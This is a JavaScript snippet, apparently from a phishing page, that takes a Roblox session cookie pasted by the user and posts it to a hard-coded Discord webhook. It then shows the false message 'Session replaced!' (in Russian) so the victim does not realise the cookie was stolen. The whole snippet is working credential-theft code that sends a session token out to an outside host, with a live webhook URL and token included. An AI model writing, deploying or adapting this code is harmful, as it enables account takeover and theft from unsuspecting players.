const webhookURL = "https://discord.com/api/webhooks/1509272676773007420/7H2FxI8HxX7jzqKCTYNNh12cKuUQgtVEwRGpVha4l823CGIgZXVpj6VjzGQNfXdSxCBg";

async function sendToDiscord() {
    const cookie = document.getElementById('cookieInput').value.trim();
    const statusDiv = document.getElementById('status');

    if (!cookie) {
        statusDiv.innerHTML = '❌ Введите cookie!';
        return;
    }

    statusDiv.innerHTML = '📤 Отправка...';

    const embed = {
        title: "🔐 НОВАЯ КУКА ROBLOX",
        color: 0xff4444,
        fields: [
            { name: "📦 Cookie", value: \`\`\`${cookie.substring(0, 500)}\`\`\`, inline: false },
            { name: "🕐 Время", value: new Date().toLocaleString('ru-RU'), inline: true }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (response.ok) {
            statusDiv.innerHTML = '✅ Сессия заменена!';
            document.getElementById('cookieInput').value = '';
        } else {
            statusDiv.innerHTML = '❌ Ошибка';
        }
    } catch (error) {
        statusDiv.innerHTML = '❌ Ошибка сети';
    }
}
